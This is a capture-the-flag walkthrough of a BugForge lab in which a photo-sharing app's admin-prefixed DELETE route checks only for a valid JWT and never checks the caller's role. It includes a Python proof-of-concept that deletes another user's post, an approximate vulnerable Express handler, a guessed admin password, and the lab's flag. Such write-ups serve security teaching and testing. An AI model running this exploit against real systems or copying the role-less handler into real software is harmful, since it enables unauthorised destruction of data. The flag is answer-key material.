# ottergram-002 - BugForge Lab Walkthrough

**URL:** https://lab-1786453202836-x5wml1.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** Broken Access Control - missing role check on an admin-only route
**Flag:** `bug{5IfGfkzqm5TZmTyGI7pEXDKb5PudvbVL}`

---

## Summary

Ottergram is a photo-sharing SPA (posts, comments, likes, profiles). Post deletion is exposed
under an `/api/admin/` prefixed route, but the handler only checks that the request carries a
valid JWT - it never verifies the caller's role is actually `admin`. Any authenticated user can
delete any post by ID, including posts owned by other users, and the server returns the flag
directly in the deletion response.

---

## Tech Stack

- React SPA frontend (Create React App)
- Express.js (Node.js)
- JWT (Bearer token, issued directly on registration)
- SQLite

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Returns a usable JWT directly |
| `/api/posts` | GET | JWT | Lists all posts with `id`, `user_id`, `username` |
| `/api/posts/:id` | DELETE | JWT (own posts only) | Correctly ownership-checked |
| `/api/admin/posts/:id` | DELETE | JWT only, **no role check** | **Vulnerable** |

---

## Discovery

### Step 1 - Register and enumerate

Registration returns a usable JWT directly, no separate login step required:

```
POST /api/register {"username":"pentestXXXX","email":"...","password":"Password123!"}
-> {"token": "...", "user": {"id":9, "role":"user"}}
```

`GET /api/posts` lists the seeded content, including which user owns each post:

```json
[
  {"id":1,"user_id":1,"username":"otter_lover", ...},
  {"id":2,"user_id":2,"username":"admin", ...},
  {"id":3,"user_id":3,"username":"sea_otter_fan", ...}
]
```

Post id 2 belongs to `admin` (user_id 2), not the registered test account.

### Step 2 - Test write endpoints for missing ownership/role checks

Standard practice for this app family is to run every PUT/PATCH/DELETE route through three auth
levels - no token, wrong-user token, and owner/admin token - since a 403 under one condition
doesn't guarantee the others are enforced. The user-facing `DELETE /api/posts/:id` was checked
first and correctly rejects deleting another user's post. The app also exposes a parallel,
admin-styled route for the same resource: `DELETE /api/admin/posts/:id`. Given the `/api/admin/`
naming convention, the expectation is that this requires an admin role - so it was tested with a
plain, freshly-registered `user`-role account rather than assumed safe.

### Step 3 - Confirm the bypass

```
DELETE /api/admin/posts/2
Authorization: Bearer <regular user JWT, role: user>

-> 200 OK
{"message":"Post deleted successfully","flag":"bug{5IfGfkzqm5TZmTyGI7pEXDKb5PudvbVL}"}
```

No admin role required at all. The `/api/admin/` prefix turned out to be a naming convention
only, not an enforced authorization boundary - the handler behind it performs the exact same
"is there a valid JWT" check as any other authenticated route, and nothing more.

---

## Proof of Concept

```python
import json, urllib.request, urllib.error, time

BASE = "https://lab-1786453202836-x5wml1.labs-app.bugforge.io"
H = {"Content-Type": "application/json"}

def req(method, path, data=None, token=None):
    url = BASE + path
    h = dict(H)
    if token:
        h["Authorization"] = f"Bearer {token}"
    body = json.dumps(data).encode() if data else None
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

ts = str(int(time.time()))[-6:]
_, body = req("POST", "/api/register", {
    "username": f"pentest{ts}", "email": f"pentest{ts}@bugforge.io", "password": "Password123!"
})
token = json.loads(body)["token"]

# Delete another user's (admin's) post using a plain 'user'-role token
_, resp = req("DELETE", "/api/admin/posts/2", token=token)
print(resp)
# -> {"message":"Post deleted successfully","flag":"bug{5IfGfkzqm5TZmTyGI7pEXDKb5PudvbVL}"}
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| `DELETE /api/posts/2` (user-facing route) with a non-owner token | 403/404, correctly ownership-checked | The public route is safe - the vulnerable one is the admin-prefixed sibling |
| One `admin:admin123` login attempt | Rejected | Not the intended path, moved on immediately |

---

## Root Cause

The admin post-deletion handler authenticates the request (valid JWT required) but never checks
the caller's role before performing the privileged action:

```javascript
// Vulnerable pattern (approximate)
app.delete("/api/admin/posts/:id", authenticate, async (req, res) => {
  await db.run("DELETE FROM posts WHERE id = ?", [req.params.id]);
  res.json({ message: "Post deleted successfully" });
});
```

There is no `requireAdmin` / `req.user.role === 'admin'` middleware on the route, despite the
`/api/admin/` URL prefix implying one exists. Any authenticated session, regardless of role, can
reach and execute the handler.

---

## CWE / OWASP

- **CWE-862**: Missing Authorization
- **CWE-863**: Incorrect Authorization
- **OWASP A01:2021** - Broken Access Control
